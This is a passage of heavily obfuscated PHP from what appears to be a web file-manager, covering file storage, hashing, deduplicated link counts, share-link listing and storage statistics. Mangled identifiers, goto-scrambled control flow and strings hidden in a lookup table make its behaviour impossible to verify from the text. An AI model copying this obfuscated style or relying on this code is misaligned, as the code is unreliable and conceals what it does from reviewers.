$this->_listAppendMeta($d¾àáŒÄµØ[$c»çäí“¦[365]]); return $d¾àáŒÄµØ; } private function _makeOrder() { $A£Ó£ñ÷ÕÏ =& $_SERVER[ç]; $CŒª¡àŒÇ = array($A£Ó£ñ÷ÕÏ[1685], $A£Ó£ñ÷ÕÏ[1684], $A£Ó£ñ÷ÕÏ[192]); $Cä í¤Á = Input::get($A£Ó£ñ÷ÕÏ[429], $A£Ó£ñ÷ÕÏ[7], $A£Ó£ñ÷ÕÏ[410], $CŒª¡àŒÇ); $f‰®ÊÕÄ—Ø = Input::get($A£Ó£ñ÷ÕÏ[430], $A£Ó£ñ÷ÕÏ[7], $A£Ó£ñ÷ÕÏ[1485], array($A£Ó£ñ÷ÕÏ[1695], $A£Ó£ñ÷ÕÏ[425])); $Béä‡‘«¼ò = $Cä í¤Á . $A£Ó£ñ÷ÕÏ[50] . $f‰®ÊÕÄ—Ø; return $this->order($Béä‡‘«¼ò); } private function _listAppendParent(&$EƒŠğ¦‹) { goto F¤Ò¦Èåºµ; F¤Ò¦Èåºµ: $cÜÌÅ¶¬œˆ =& $_SERVER[ç]; $dĞŞ„¶÷ = array_unique(array_to_keyvalue($EƒŠğ¦‹, $cÜÌÅ¶¬œˆ[33], $cÜÌÅ¶¬œˆ[1682])); $dĞŞ„¶÷ = array_remove_value($dĞŞ„¶÷, $cÜÌÅ¶¬œˆ[491]); goto bä÷‰± ‚Š; bä÷‰± ‚Š: if (!$dĞŞ„¶÷) { return; } $Dæ…»º‰¸ = $this->where(array($cÜÌÅ¶¬œˆ[1683] => array($cÜÌÅ¶¬œˆ[7], $dĞŞ„¶÷)))->select(); $Dæ…»º‰¸ = array_to_keyvalue($Dæ…»º‰¸, $cÜÌÅ¶¬œˆ[1693]); goto C¯ğëçä¢; C¯ğëçä¢: foreach ($EƒŠğ¦‹ as &$Aª¢ŞâˆÒô) { if (isset($Dæ…»º‰¸[$Aª¢ŞâˆÒô[$cÜÌÅ¶¬œˆ[1682]]])) { $Aª¢ŞâˆÒô[$cÜÌÅ¶¬œˆ[1696]] = $Dæ…»º‰¸[$Aª¢ŞâˆÒô[$cÜÌÅ¶¬œˆ[1682]]]; } } unset($Aª¢ŞâˆÒô); goto Eò¬ªÆè÷ø; Eò¬ªÆè÷ø: } private function _listAppendUser(&$cÀÒÃİ†•ù) { goto C‹¼„×•ò; E‡¢ Õ®¤: foreach ($cÀÒÃİ†•ù as &$F™ŠÊŞòŠ–) { $F™ŠÊŞòŠ–[$A‘÷ô—¦‚Õ[557]] = $cĞ‹‚É‘Ì‘[$F™ŠÊŞòŠ–[$A‘÷ô—¦‚Õ[1491]]]; if (isset($F™ŠÊŞòŠ–[$A‘÷ô—¦‚Õ[1696]])) { $F™ŠÊŞòŠ–[$A‘÷ô—¦‚Õ[1696]][$A‘÷ô—¦‚Õ[557]] = $cĞ‹‚É‘Ì‘[$F™ŠÊŞòŠ–[$A‘÷ô—¦‚Õ[1696]][$A‘÷ô—¦‚Õ[1491]]]; } } unset($F™ŠÊŞòŠ–); goto FÂˆ¯ø¤¥; C‹¼„×•ò: $A‘÷ô—¦‚Õ =& $_SERVER[ç]; $aÌØ—ëÍÆÏ = array_unique(array_to_keyvalue($cÀÒÃİ†•ù, $A‘÷ô—¦‚Õ[33], $A‘÷ô—¦‚Õ[1491])); $aÌØ—ëÍÆÏ = array_remove_value($aÌØ—ëÍÆÏ, $A‘÷ô—¦‚Õ[491]); goto Fé®½¿˜‰; Fé®½¿˜‰: if (count($aÌØ—ëÍÆÏ) == 0) { return; } foreach ($cÀÒÃİ†•ù as $F™ŠÊŞòŠ–) { if (isset($F™ŠÊŞòŠ–[$A‘÷ô—¦‚Õ[1696]])) { $aÌØ—ëÍÆÏ[] = $F™ŠÊŞòŠ–[$A‘÷ô—¦‚Õ[1696]][$A‘÷ô—¦‚Õ[1491]]; } } $cĞ‹‚É‘Ì‘ = Model($A‘÷ô—¦‚Õ[501])->userListInfo($aÌØ—ëÍÆÏ); goto E‡¢ Õ®¤; FÂˆ¯ø¤¥: } private function _listAppendMeta(&$bÜ÷†¨øª…) { goto cĞ§Èåçö; DÚ©÷›†õ¡: if (!$Aˆ©Õ£©ÎÇ) { return; } foreach ($bÜ÷†¨øª… as $FŸáÍÃ©ÊÅ) { if (isset($FŸáÍÃ©ÊÅ[$B©½¡œ¶–™[1696]])) { $Aˆ©Õ£©ÎÇ[] = $FŸáÍÃ©ÊÅ[$B©½¡œ¶–™[1696]][$B©½¡œ¶–™[1693]]; } } $dÅ»±‘£÷Ğ = $this->metaList($Aˆ©Õ£©ÎÇ); goto e÷Áê˜˜…Ü; e÷Áê˜˜…Ü: if (!$dÅ»±‘£÷Ğ) { return !1; } foreach ($bÜ÷†¨øª… as &$FŸáÍÃ©ÊÅ) { $FŸáÍÃ©ÊÅ[$B©½¡œ¶–™[439]] = $dÅ»±‘£÷Ğ[$FŸáÍÃ©ÊÅ[$B©½¡œ¶–™[1693]]]; if (isset($FŸáÍÃ©ÊÅ[$B©½¡œ¶–™[1696]])) { $FŸáÍÃ©ÊÅ[$B©½¡œ¶–™[1696]][$B©½¡œ¶–™[439]] = $dÅ»±‘£÷Ğ[$FŸáÍÃ©ÊÅ[$B©½¡œ¶–™[1696]][$B©½¡œ¶–™[1693]]]; } } unset($FŸáÍÃ©ÊÅ); goto aíã˜•ôƒ; cĞ§Èåçö: $B©½¡œ¶–™ =& $_SERVER[ç]; $Aˆ©Õ£©ÎÇ = array_unique(array_to_keyvalue($bÜ÷†¨øª…, $B©½¡œ¶–™[33], $B©½¡œ¶–™[1693])); $Aˆ©Õ£©ÎÇ = array_remove_value($Aˆ©Õ£©ÎÇ, $B©½¡œ¶–™[491]); goto DÚ©÷›†õ¡; aíã˜•ôƒ: } private function metaList($aË‚íŠ†Æî) { goto fÖ”í‚¸; fÖ”í‚¸: $fË†­ó¨„ =& $_SERVER[ç]; if (!$aË‚íŠ†Æî) { return array(); } $E¯™ ¤‡§ = array($fË†­ó¨„[1693] => array($fË†­ó¨„[7], $aË‚íŠ†Æî)); goto BÔÙ’ƒĞ³·; CŠÙƒÄ´î: return $AÃÒ‡åÜîº ? $AÃÒ‡åÜîº : array(); goto d¦»„¯ëŠ²; BÔÙ’ƒĞ³·: $AÃÒ‡åÜîº = Model($fË†­ó¨„[1697])->where($E¯™ ¤‡§)->select(); $AÃÒ‡åÜîº = array_to_keyvalue_group($AÃÒ‡åÜîº, $fË†­ó¨„[1693]); foreach ($AÃÒ‡åÜîº as $f™¼Öğã§ => $C´ãƒ¯Ÿ¢) { $fÅÃÜË½Á‹ = array(); foreach ($C´ãƒ¯Ÿ¢ as $Fñê„Ì™ğ) { $fÅÃÜË½Á‹[$Fñê„Ì™ğ[$fË†­ó¨„[92]]] = $Fñê„Ì™ğ[$fË†­ó¨„[370]]; } $AÃÒ‡åÜîº[$f™¼Öğã§] = $fÅÃÜË½Á‹; } goto CŠÙƒÄ´î; d¦»„¯ëŠ²: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\x6c\145"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\155\x65" => "\151\x6f\x5f\x66\151\x6c\x65\x5f\155\145\x74\x61", "\155\x65\x74\x61\106\x69\145\154\x64" => "\146\x69\x6c\x65\x49\x44"); public function fileInfo($bĞÑ¸ÄÍ‰¬) { $cİ‹«¹§Üù =& $_SERVER[ç]; static $eÈ¸œÇÏ´ˆ = array(); if (!isset($eÈ¸œÇÏ´ˆ[$bĞÑ¸ÄÍ‰¬])) { $fÄ£ùª¬’È = $cİ‹«¹§Üù[1698]; $fœøÉ¨Á‚Ö = Model($cİ‹«¹§Üù[444])->field($fÄ£ùª¬’È)->where(array($cİ‹«¹§Üù[442] => $bĞÑ¸ÄÍ‰¬))->find(); $eÈ¸œÇÏ´ˆ[$bĞÑ¸ÄÍ‰¬] = $fœøÉ¨Á‚Ö; } return $eÈ¸œÇÏ´ˆ[$bĞÑ¸ÄÍ‰¬]; } public function addFileByContent($F’¨³íÌ = '', $a¼£±Ä¢Àñ = '') { goto AÔÃ¾Ü–¾ñ; F×Ô´……øİ: if (file_exists($d³Éíµ¼À£)) { @unlink($d³Éíµ¼À£); } return $FõÕœæˆ„¨; goto cƒ‡ñœŞ“; AÔÃ¾Ü–¾ñ: $C’Ÿ’ßÀÓŞ =& $_SERVER[ç]; $bÔùÕ¸Ú¬­ = TEMP_PATH . $C’Ÿ’ßÀÓŞ[1699]; if (!is_dir($bÔùÕ¸Ú¬­)) { mk_dir($bÔùÕ¸Ú¬­); } goto bŒ›Ãœ†¤á; bŒ›Ãœ†¤á: $d³Éíµ¼À£ = $bÔùÕ¸Ú¬­ . $C’Ÿ’ßÀÓŞ[1700] . rand_string(16); file_put_contents($d³Éíµ¼À£, $F’¨³íÌ); $FõÕœæˆ„¨ = $this->addFile($d³Éíµ¼À£, $a¼£±Ä¢Àñ, !0); goto F×Ô´……øİ; cƒ‡ñœŞ“: } public function createFileName($d”ÃñÂ¼¸Å, $f¥«´Á›ë® = false) { goto BªáÀ¢‹Å; BªáÀ¢‹Å: $F°Ñôáê¾Á =& $_SERVER[ç]; $A¾èµ¶ÃŠä = IO::init($F°Ñôáê¾Á[8]); $bÈˆê”ì×Ü = $this->makeFilePath($d”ÃñÂ¼¸Å, $A¾èµ¶ÃŠä, $f¥«´Á›ë®); goto e¶¨ßÀ¤; e¶¨ßÀ¤: $E…¢ÜíÀ• = $A¾èµ¶ÃŠä->pathFather($bÈˆê”ì×Ü); static $dßÎÄŠ–À© = false; $dÙ–­éîˆÄ = $F°Ñôáê¾Á[1701] . md5($E…¢ÜíÀ•); goto dø‰·Ì¬Î©; dø‰·Ì¬Î©: if (!$dßÎÄŠ–À© && !Cache::get($dÙ–­éîˆÄ)) { $dßÎÄŠ–À© = !0; $E‰æÀÏôé… = IO::mkdir($E…¢ÜíÀ•); if (!IO::exist($E‰æÀÏôé… . $F°Ñôáê¾Á[1702])) { IO::mkfile($E‰æÀÏôé… . $F°Ñôáê¾Á[1702]); } Cache::set($dÙ–­éîˆÄ, 1, 3600 * 2); } return $bÈˆê”ì×Ü; goto e˜Š³šÍÎ†; e˜Š³šÍÎ†: } public function makeFilePath($d†Š…£œ‰æ, $d³ Õˆì, $BøÑß‘‹˜ñ = false) { goto Bó©«êø‚; bÜ†ŒŞÓòİ: if (!$d†Š…£œ‰æ) { $Eİñï£”º· = $e³°èëôê…[1705]; } switch ($Eİñï£”º·) { case $e³°èëôê…[1706]: $F¼˜Õ»Æ²„ = $F¼˜Õ»Æ²„ . $e³°èëôê…[94] . $d³ Õˆì->ext($d†Š…£œ‰æ); if ($B«ÙŸÖ—Ì == $e³°èëôê…[1644]) { $F¼˜Õ»Æ²„ .= $e³°èëôê…[1392]; } break; case $e³°èëôê…[1707]: goto cÕ„¿Äã; D«ŠğÀ¾˜: if (IO::isTypeObject($F¼˜Õ»Æ²„) && !IO::isUploadServer($F¼˜Õ»Æ²„)) { $déÙ§Â¥êá = IO::setContent($F¼˜Õ»Æ²„, $e³°èëôê…[33]); if (!$déÙ§Â¥êá) { show_json($e³°èëôê…[1711], !1); } } CacheLock::unlock($B˜’º¦£÷); break; goto CØõ±çî«¹; cÕ„¿Äã: $fÍ¨ëÓë÷š = Model($e³°èëôê…[1091])->get($e³°èëôê…[1388]); $Eèµ‹Ô³ÓË = substr(md5($e³°èëôê…[1708] . $fÍ¨ëÓë÷š . date($e³°èëôê…[693])), 0, 8); $Bå«Ğøì˜Í = KodIO::defaultDriver(); goto eÖÈƒ„‡; fù›œ…ªÍ£: CacheLock::lock($B˜’º¦£÷); $F¼˜Õ»Æ²„ = $E–µÜ­ù . $d†Š…£œ‰æ; if (IO::exist($E–µÜ­ù . $d†Š…£œ‰æ)) { $eš¥»ÛÙ˜ = substr($d†Š…£œ‰æ, 0, strlen($d†Š…£œ‰æ) - strlen($B«ÙŸÖ—Ì)); $F¼˜Õ»Æ²„ = $E–µÜ­ù . $eš¥»ÛÙ˜ . substr($BøÑß‘‹˜ñ, 0, 5) . $e³°èëôê…[94] . $B«ÙŸÖ—Ì; } goto D«ŠğÀ¾˜; eÖÈƒ„‡: $E–µÜ­ù = $e³°èëôê…[1089] . $Bå«Ğøì˜Í[$e³°èëôê…[388]] . $e³°èëôê…[396] . date($e³°èëôê…[1709]) . $Eèµ‹Ô³ÓË . $e³°èëôê…[8]; if ($B«ÙŸÖ—Ì == $e³°èëôê…[1644]) { $d†Š…£œ‰æ .= $e³°èëôê…[1392]; } $B˜’º¦£÷ = $e³°èëôê…[1710] . $E–µÜ­ù . $d†Š…£œ‰æ; goto fù›œ…ªÍ£; CØõ±çî«¹: case $e³°èëôê…[1705]: break; default: break; } return $F¼˜Õ»Æ²„; goto fÑßÃøÇã¥; Bó©«êø‚: $e³°èëôê… =& $_SERVER[ç]; $Eİñï£”º· = Model($e³°èëôê…[1091])->get($e³°èëôê…[1703]); $E–µÜ­ù = KodIO::defaultIO() . date($e³°èëôê…[1704]); goto FÇÙÜ–Â†; FÇÙÜ–Â†: $F¼˜Õ»Æ²„ = $E–µÜ­ù . rand_string(5) . short_id(100); $d†Š…£œ‰æ = str_replace($e³°èëôê…[8], $e³°èëôê…[70], KodIO::clear($d†Š…£œ‰æ)); $B«ÙŸÖ—Ì = $d³ Õˆì->ext($d†Š…£œ‰æ); goto bÜ†ŒŞÓòİ; fÑßÃøÇã¥: } public function addFileByRemote($fÖŠ‚”Øİ, $Bâ…çÔØ“¾, $DÙíŒÍ†²º = array()) { goto EÇ½ø¤—òğ; EÇ½ø¤—òğ: $fä±Š‹¾‡ =& $_SERVER[ç]; if (!IO::exist($fÖŠ‚”Øİ)) { return !1; } $aĞƒÔ÷ ¹È = $DÙíŒÍ†²º[$fä±Š‹¾‡[169]] ? $DÙíŒÍ†²º[$fä±Š‹¾‡[169]] : $fä±Š‹¾‡[33]; goto CÄ±‰¼£÷; CĞ«Õ¹ÚÍĞ: if ($cäò¼øô’– = $this->addFileCheckExist($fïºÂ½ëÓ³[$fä±Š‹¾‡[170]], $fïºÂ½ëÓ³[$fä±Š‹¾‡[169]], $fïºÂ½ëÓ³[$fä±Š‹¾‡[77]])) { return $cäò¼øô’–; } return $this->addFileData($fïºÂ½ëÓ³); goto D‹„¦¹º Ì; CÄ±‰¼£÷: $cÒÉÃ¿æ’÷ = IO::hashMd5($fÖŠ‚”Øİ, $aĞƒÔ÷ ¹È); $C‡‘’Û±  = KodIO::defaultDriver(); $fïºÂ½ëÓ³ = array($fä±Š‹¾‡[543] => IO::size($fÖŠ‚”Øİ), $fä±Š‹¾‡[1712] => 1, $fä±Š‹¾‡[407] => $Bâ…çÔØ“¾, $fä±Š‹¾‡[745] => $C‡‘’Û± [$fä±Š‹¾‡[388]], $fä±Š‹¾‡[408] => $fÖŠ‚”Øİ, $fä±Š‹¾‡[1713] => $DÙíŒÍ†²º[$fä±Š‹¾‡[170]] ? $DÙíŒÍ†²º[$fä±Š‹¾‡[170]] : IO::hashSimple($fÖŠ‚”Øİ), $fä±Š‹¾‡[1714] => $cÒÉÃ¿æ’÷ ? $cÒÉÃ¿æ’÷ : $aĞƒÔ÷ ¹È); goto CĞ«Õ¹ÚÍĞ; D‹„¦¹º Ì: } private function addFileData($FÏ•‰ÃŸÁÑ) { $bó•½‹ó©¡ =& $_SERVER[ç]; if (!$FÏ•‰ÃŸÁÑ) { return !1; } $FÏ•‰ÃŸÁÑ[$bó•½‹ó©¡[77]] = intval($FÏ•‰ÃŸÁÑ[$bó•½‹ó©¡[77]]); if (!$FÏ•‰ÃŸÁÑ[$bó•½‹ó©¡[77]] && strlen($FÏ•‰ÃŸÁÑ[$bó•½‹ó©¡[170]]) > 32) { $FÏ•‰ÃŸÁÑ[$bó•½‹ó©¡[77]] = intval(substr($FÏ•‰ÃŸÁÑ[$bó•½‹ó©¡[170]], 32)); } $Dç¼ŸÑ’Œ = $this->add($FÏ•‰ÃŸÁÑ); return $this->find($Dç¼ŸÑ’Œ); } public function addFile($FÄ¶‡äó†±, $aœ±âĞä×‹, $Fğëª— = false) { goto bÜ¶‘Æ†Ü; d²Ë¦˜Şäç: $f¡Õè‰‡š = $this->addFileMake($FÄ¶‡äó†±, $aßÇ…ö‰®Î, $bÛĞ“£Û†’, $aèã†˜õ £, $aœ±âĞä×‹, $Fğëª—); $fªÆé×óÈî = $this->addFileData($f¡Õè‰‡š); CacheLock::unlock($c ‰ˆáÉ„); goto a‹±Ï­ŠÃİ; a‹±Ï­ŠÃİ: return $fªÆé×óÈî; goto FøÑµŠŞ”Œ; f‘ƒ Š¨Îğ: $c ‰ˆáÉ„ = $_SERVER[ç][1715] . $aèã†˜õ £; CacheLock::lock($c ‰ˆáÉ„); if ($bÌƒè……ù = $this->addFileCheckExist($bÛĞ“£Û†’, $aèã†˜õ £, $aßÇ…ö‰®Î)) { CacheLock::unlock($c ‰ˆáÉ„); return $bÌƒè……ù; } goto d²Ë¦˜Şäç; bÜ¶‘Æ†Ü: $bÛĞ“£Û†’ = IO::hashSimple($FÄ¶‡äó†±); $aèã†˜õ £ = IO::hashMd5($FÄ¶‡äó†±); $aßÇ…ö‰®Î = IO::size($FÄ¶‡äó†±); goto f‘ƒ Š¨Îğ; FøÑµŠŞ”Œ: } public function addFileMake($eàóìó¥Íâ, $F•Òœ¶÷á¸, $FíŒ«ŞÛŠã, $dÄˆ²ß±, $C„Éùùˆæ, $F¸ÁÂŒŞÁø) { goto fÒ‰á™§ë; fÒ‰á™§ë: $E¸ùÀÌ‚µç =& $_SERVER[ç]; $Eí¦ÂØäÁ = $this->createFileName($C„Éùùˆæ, $dÄˆ²ß±); $DŒÕâŠ = get_path_father($Eí¦ÂØäÁ); goto F·ÜÅ—½á; F·ÜÅ—½á: $eõ¯Šç·ç = get_path_this($Eí¦ÂØäÁ); if ($F¸ÁÂŒŞÁø) { $c¶ ±¦ó = IO::move($eàóìó¥Íâ, $DŒÕâŠ, !1, $eõ¯Šç·ç); } else { $c¶ ±¦ó = IO::copy($eàóìó¥Íâ, $DŒÕâŠ, !1, $eõ¯Šç·ç); } if (!$c¶ ±¦ó) { return !1; } goto fğøäæŞ§; fğøäæŞ§: $EŠÓÑ£µ’’ = KodIO::defaultDriver(); $BÌç¿ÁÏàÎ = array($E¸ùÀÌ‚µç[543] => $F•Òœ¶÷á¸, $E¸ùÀÌ‚µç[1712] => 1, $E¸ùÀÌ‚µç[407] => $C„Éùùˆæ, $E¸ùÀÌ‚µç[745] => $EŠÓÑ£µ’’[$E¸ùÀÌ‚µç[388]], $E¸ùÀÌ‚µç[408] => $Eí¦ÂØäÁ, $E¸ùÀÌ‚µç[1713] => $FíŒ«ŞÛŠã, $E¸ùÀÌ‚µç[1714] => $dÄˆ²ß±); return $BÌç¿ÁÏàÎ; goto C¼ÊŒ—¥…Â; C¼ÊŒ—¥…Â: } public function addFileCheckExist($EæôÕ«­À‘, $dğÊùÖ„”, $Bãµ•­ªÄ) { $fˆ‘µ¦¯ç =& $_SERVER[ç]; $D °†ÎİØ– = $this->findByHash($EæôÕ«­À‘, $dğÊùÖ„”); if (!$D °†ÎİØ–) { return !1; } $aÊŒ¯ĞçÅ§ = array($fˆ‘µ¦¯ç[1712] => intval($D °†ÎİØ–[$fˆ‘µ¦¯ç[1716]]) + 1, $fˆ‘µ¦¯ç[543] => $Bãµ•­ªÄ); $this->where(array($fˆ‘µ¦¯ç[442] => $D °†ÎİØ–[$fˆ‘µ¦¯ç[441]]))->save($aÊŒ¯ĞçÅ§); return $D °†ÎİØ–; } public function remove($d­ˆ‚º‚Éá) { $this->linkCountChange($d­ˆ‚º‚Éá, !1); $this->clearEmpty(); return !0; } public function linkAdd($eÀîî„Šº¬) { $this->linkCountChange($eÀîî„Šº¬, !0); } public function linkCountChange($eÒÊ×õéğ, $BñÍê×Î´Û) { goto e±–¼˜¥°; bĞº¢Ï¯‘: foreach ($CİœªˆÈ as $c–’‡Èïé× => $Bİ„Ú¯¢Åç) { $Cé×–Ÿ‘— = $Bİ„Ú¯¢Åç . $dˆÓÛŒóá±[33]; if (!$a—¶ä±´…[$Cé×–Ÿ‘—]) { $a—¶ä±´…[$Cé×–Ÿ‘—] = array(); } $a—¶ä±´…[$Cé×–Ÿ‘—][] = $c–’‡Èïé×; } foreach ($a—¶ä±´… as $Bİ„Ú¯¢Åç => $C·ªß‚¦‡) { if (!$C·ªß‚¦‡) { continue; } $Bİ„Ú¯¢Åç = $BñÍê×Î´Û ? $Bİ„Ú¯¢Åç : -intval($Bİ„Ú¯¢Åç); $cŒŸ÷ìÆ¤ = array($dˆÓÛŒóá±[441] => array($dˆÓÛŒóá±[7], $C·ªß‚¦‡)); if ($Bİ„Ú¯¢Åç < 0) { $cŒŸ÷ìÆ¤[$dˆÓÛŒóá±[1716]] = array($dˆÓÛŒóá±[940], abs($Bİ„Ú¯¢Åç)); } $this->where($cŒŸ÷ìÆ¤)->setAdd($dˆÓÛŒóá±[1716], $Bİ„Ú¯¢Åç); } goto eôÕ£îîÛ; e±–¼˜¥°: $dˆÓÛŒóá± =& $_SERVER[ç]; if (!$eÒÊ×õéğ) { return; } if (!is_array($eÒÊ×õéğ)) { $eÒÊ×õéğ = array($eÒÊ×õéğ); } goto f™¦¾¶‰æÙ; f™¦¾¶‰æÙ: $CİœªˆÈ = array(); foreach ($eÒÊ×õéğ as $c–’‡Èïé×) { $Cé×–Ÿ‘— = $c–’‡Èïé× . $dˆÓÛŒóá±[33]; if (!$CİœªˆÈ[$Cé×–Ÿ‘—]) { $CİœªˆÈ[$Cé×–Ÿ‘—] = 0; } $CİœªˆÈ[$Cé×–Ÿ‘—]++; } $a—¶ä±´… = array(); goto bĞº¢Ï¯‘; eôÕ£îîÛ: } public function findByHash($Fˆƒµß˜²Ø, $dõ¾»§Ûë¬ = false) { $C‚ôÏÂïÂõ =& $_SERVER[ç]; if (!$Fˆƒµß˜²Ø && !$dõ¾»§Ûë¬) { return !1; } $dİİš©ù”¶ = array($C‚ôÏÂïÂõ[1713] => $Fˆƒµß˜²Ø); if ($dõ¾»§Ûë¬) { $dİİš©ù”¶ = array($C‚ôÏÂïÂõ[1714] => $dõ¾»§Ûë¬); } return $this->order($C‚ôÏÂïÂõ[1717])->where($dİİš©ù”¶)->find(); } public function clearEmpty($b‰ÔÍ Ö = 0) { goto B‡óŸÖ˜¿¬; a²Óç‡ÙÈ—: $fÃ²òÊ›ìÜ = $this->where($fÇ­‰ŒºÁŠ)->select(); if (!$fÃ²òÊ›ìÜ) { return; } $dÇ÷í±†¶ğ = new Task($d†ïÜ‰İ¬[1719], $d†ïÜ‰İ¬[33], count($fÃ²òÊ›ìÜ)); goto d¾Šóå¡¡’; B‡óŸÖ˜¿¬: $d†ïÜ‰İ¬ =& $_SERVER[ç]; $açÕè¶ˆì¥ = time() - 3600 * 24 * $b‰ÔÍ Ö; $fÇ­‰ŒºÁŠ = $d†ïÜ‰İ¬[1718] . $açÕè¶ˆì¥; goto a²Óç‡ÙÈ—; d¾Šóå¡¡’: foreach ($fÃ²òÊ›ìÜ as $Cê×¯Ò¸Ê‚) { $dÇ÷í±†¶ğ->update(1); $this->resetFile($Cê×¯Ò¸Ê‚); } $dÇ÷í±†¶ğ->end(); goto A×‚İñœŞÌ; A×‚İñœŞÌ: } public function resetFile($e†…™…Œ°İ) { goto FÜğ‡§Õƒ; FÚ¿ß–½¡: $eã¾©©ò = Model($f†ƒå¶Œƒ½[1720])->where($CÅ®º»×ËÓ)->count(); $c’Ÿäƒ—¬  = intval($C×ç•Á¸‚) + intval($eã¾©©ò); if ($c’Ÿäƒ—¬  == 0) { IO::remove($e†…™…Œ°İ[$f†ƒå¶Œƒ½[75]]); $this->where($CÅ®º»×ËÓ)->delete(); $this->metaSet($e†…™…Œ°İ[$f†ƒå¶Œƒ½[441]], null, null); return; } goto d‚Í–¾ÂĞ; FÜğ‡§Õƒ: $f†ƒå¶Œƒ½ =& $_SERVER[ç]; $CÅ®º»×ËÓ = array($f†ƒå¶Œƒ½[442] => $e†…™…Œ°İ[$f†ƒå¶Œƒ½[441]]); $C×ç•Á¸‚ = Model($f†ƒå¶Œƒ½[1171])->where($CÅ®º»×ËÓ)->count(); goto FÚ¿ß–½¡; d‚Í–¾ÂĞ: if ($e†…™…Œ°İ[$f†ƒå¶Œƒ½[1716]] != $c’Ÿäƒ—¬ ) { $this->where($CÅ®º»×ËÓ)->save(array($f†ƒå¶Œƒ½[1712] => $c’Ÿäƒ—¬ )); } goto C¢ßŞ·ŞĞ¬; C¢ßŞ·ŞĞ¬: } public function storageInfo($B‰Šö¹Ü®Â = false) { goto fƒ‡±À¹; D¬¼Á‚ÙäÆ: $eÖ¥±ÚËÌŒ = 1; $BŒêñ™Óì¸ = 0; $bÜ…°İ³ÍÎ = 5000; goto Dò¥Çº¾»è; fƒ‡±À¹: $D¿ä¿ÄÜÂ‘ =& $_SERVER[ç]; $A¦¬øôø‹– = $this->count() + 0.0; $D›ÑùÄ÷¯ = 0; goto D¬¼Á‚ÙäÆ; Dò¥Çº¾»è: for ($f‘Ì¼¿¡£ = 0; $f‘Ì¼¿¡£ < $A¦¬øôø‹–; $f‘Ì¼¿¡£ = $f‘Ì¼¿¡£ + $bÜ…°İ³ÍÎ) { $bô–¦…Èè = $this->limit($f‘Ì¼¿¡£, $f‘Ì¼¿¡£ + $bÜ…°İ³ÍÎ)->select(); foreach ($bô–¦…Èè as $eğ»ëô“Ø) { $eÖ¥±ÚËÌŒ += $eğ»ëô“Ø[$D¿ä¿ÄÜÂ‘[77]] * $eğ»ëô“Ø[$D¿ä¿ÄÜÂ‘[1716]]; $D›ÑùÄ÷¯ += $eğ»ëô“Ø[$D¿ä¿ÄÜÂ‘[77]] * ($eğ»ëô“Ø[$D¿ä¿ÄÜÂ‘[1716]] - 1); $BŒêñ™Óì¸ += $eğ»ëô“Ø[$D¿ä¿ÄÜÂ‘[1716]]; } } $DÃƒèóô ¬ = array($D¿ä¿ÄÜÂ‘[1721] => $eÖ¥±ÚËÌŒ, $D¿ä¿ÄÜÂ‘[1722] => $D›ÑùÄ÷¯, $D¿ä¿ÄÜÂ‘[1723] => $D›ÑùÄ÷¯ / $eÖ¥±ÚËÌŒ, $D¿ä¿ÄÜÂ‘[81] => $A¦¬øôø‹–, $D¿ä¿ÄÜÂ‘[1724] => $BŒêñ™Óì¸); return $DÃƒèóô ¬; goto cİ‰¢ª³åØ; cİ‰¢ª³åØ: } } goto a¢°ãß–¬Ô; f‘„•Ä§ß: define($_SERVER[ç][235], 2); define($_SERVER[ç][236], 3); define($_SERVER[ç][237], 1); goto D‚ää¹ÚğÖ; dâ»Ôó¥å: class PathDriverDbShareLink extends PathDriverDB { public function __construct($F·íàã¾¨) { $this->pathParse = $F·íàã¾¨; $this->model = Model($_SERVER[ç][1171]); } protected function infoParse($CÅä¹²»î, $A›šë£œÊŸ = false, $BäÜ²ˆØ‡è = false) { $B‡·’¿Â‰ =& $_SERVER[ç]; return Action($B‡·’¿Â‰[1037])->sharePathInfo($this->pathParse[$B‡·’¿Â‰[75]], !0); } public function listPath($F”Æë‘µºÌ, $c³¸çõâĞŸ = false) { $A“Áİô˜ =& $_SERVER[ç]; $C„©‡óÕ­ = parent::listPath($F”Æë‘µºÌ, $c³¸çõâĞŸ); foreach ($C„©‡óÕ­ as $a¢ÊµŒ¸¬è => $e»‘ÒØ”İë) { if (!in_array($a¢ÊµŒ¸¬è, array($A“Áİô˜[73], $A“Áİô˜[74]))) { continue; } foreach ($e»‘ÒØ”İë as $EÔšµ‡„±• => $F×ÙªÑ…ß“) { $C„©‡óÕ­[$a¢ÊµŒ¸¬è][$EÔšµ‡„±•] = Action($A“Áİô˜[1037])->shareItemInfo($F×ÙªÑ…ß“); } } return $C„©‡óÕ­; } public function listAll($c•»ã™¯œ†) { goto B¸‘˜Ÿ¨¬; A¾º†ÆîÂ: $Cš‘Úš = $this->model->listAll($c•»ã™¯œ†); foreach ($Cš‘Úš as &$cî­Õá‚™†) { $cî­Õá‚™†[$D’ƒÒÑ‹[84]] = Action($D’ƒÒÑ‹[1037])->shareItemInfo($cî­Õá‚™†[$D’ƒÒÑ‹[84]]); } unset($cî­Õá‚™†); goto FïóÇàÁóâ; B¸‘˜Ÿ¨¬: $D’ƒÒÑ‹ =& $_SERVER[ç]; $aĞÄ‡ŞÓ²å = IO::info($this->pathParse[$D’ƒÒÑ‹[75]]); if (!$aĞÄ‡ŞÓ²å) { return array(); } goto A¾º†ÆîÂ; FïóÇàÁóâ: return $Cš‘Úš; goto BÀä’–†óğ; BÀä’–†óğ: } } class PathDriverDriverShareItem { public function __construct($F£‰ï¦£ÆÅ) { $this->pathParse = $F£‰ï¦£ÆÅ; } public function __call($a‰°ÕÇ¾æ£, $cøçºíêÂÉ) { $fÍˆŠ»¸ä• =& $_SERVER[ç]; if (method_exists($this, $a‰°ÕÇ¾æ£)) { return; } $e¦È¼ÕÁ¦„ = call_user_func_array(array($fÍˆŠ»¸ä•[1179], $a‰°ÕÇ¾æ£), $cøçºíêÂÉ); $eêéôá‰„ = array($fÍˆŠ»¸ä•[1180], $fÍˆŠ»¸ä•[1181], $fÍˆŠ»¸ä•[1182], $fÍˆŠ»¸ä•[1183], $fÍˆŠ»¸ä•[513], $fÍˆŠ»¸ä•[515], $fÍˆŠ»¸ä•[1184], $fÍˆŠ»¸ä•[106], $fÍˆŠ»¸ä•[1185], $fÍˆŠ»¸ä•[1186]); if (in_array($a‰°ÕÇ¾æ£, $eêéôá‰„)) { $e¦È¼ÕÁ¦„ = $this->getPathOuter($e¦È¼ÕÁ¦„); } return $e¦È¼ÕÁ¦„; } public function 